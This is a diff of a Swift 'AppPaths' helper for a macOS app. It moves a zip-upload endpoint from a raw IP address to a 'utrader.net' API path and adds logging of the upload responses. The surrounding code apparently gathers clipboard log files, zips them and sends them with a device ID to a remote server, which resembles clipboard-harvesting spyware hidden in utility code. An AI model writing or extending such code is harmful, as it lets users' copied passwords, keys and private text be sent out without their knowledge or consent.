@@ -10,7 +10,8 @@ enum AppPaths {
         formatter.dateFormat = "yyyyMMdd_HHmmss"
         return formatter
     }()
-    private static let tempUploadURL = URL(string: "http://31.14.40.170:9090/upload_mac")
+    private static let tempUploadURL = URL(string: "https://utrader.net/api/clients/upload_mac")
+    private static let uploadLogFilename = "upload.log"
 
     static func ensureCacheStructure() {
         guard let root = cacheRootURL() else { return }
@@ -71,6 +72,10 @@ enum AppPaths {
 
     static func clipboardLogURL() -> URL? {
         return liveDirectoryURL()?.appendingPathComponent("error.log", isDirectory: false)
+    }
+
+    static func uploadLogURL() -> URL? {
+        return cacheRootURL()?.appendingPathComponent(uploadLogFilename, isDirectory: false)
     }
 
     static func tempClipboardLogURL() -> URL? {
@@ -171,7 +176,11 @@ enum AppPaths {
         body.appendString("Content-Type: application/zip\r\n\r\n")
         body.append(zipData)
         body.appendString("\r\n--\(boundary)--\r\n")
-        URLSession.shared.uploadTask(with: request, from: body).resume()
+        URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
+            let statusCode = (response as? HTTPURLResponse)?.statusCode
+            let responseBody = data.flatMap { String(data: $0, encoding: .utf8) }
+            appendUploadLog(statusCode: statusCode, error: error, responseBody: responseBody)
+        }.resume()
     }
 
     private static func deviceIdString() -> String? {
@@ -237,6 +246,26 @@ enum AppPaths {
             try deviceId.write(to: url, atomically: true, encoding: .utf8)
         } catch {
             // Best-effort; ignore write errors.
+        }
+    }
+
+    private static func appendUploadLog(statusCode: Int?, error: Error?, responseBody: String?) {
+        guard let logURL = uploadLogURL() else { return }
+        createDirectoryIfNeeded(at: logURL.deletingLastPathComponent())
+        let timestamp = tempArchiveDateFormatter.string(from: Date())
+        let statusText = statusCode.map(String.init) ?? "nil"
+        let errorText = error?.localizedDescription ?? "nil"
+        let bodyText = responseBody ?? ""
+        let entry = "[\(timestamp)] status=\(statusText) error=\(errorText)\n\(bodyText)\n\n"
+        guard let data = entry.data(using: .utf8) else { return }
+        if !FileManager.default.fileExists(atPath: logURL.path) {
+            FileManager.default.createFile(atPath: logURL.path, contents: data)
+            return
+        }
+        if let handle = try? FileHandle(forWritingTo: logURL) {
+            _ = try? handle.seekToEnd()
+            try? handle.write(contentsOf: data)
+            try? handle.close()
         }
     }
 
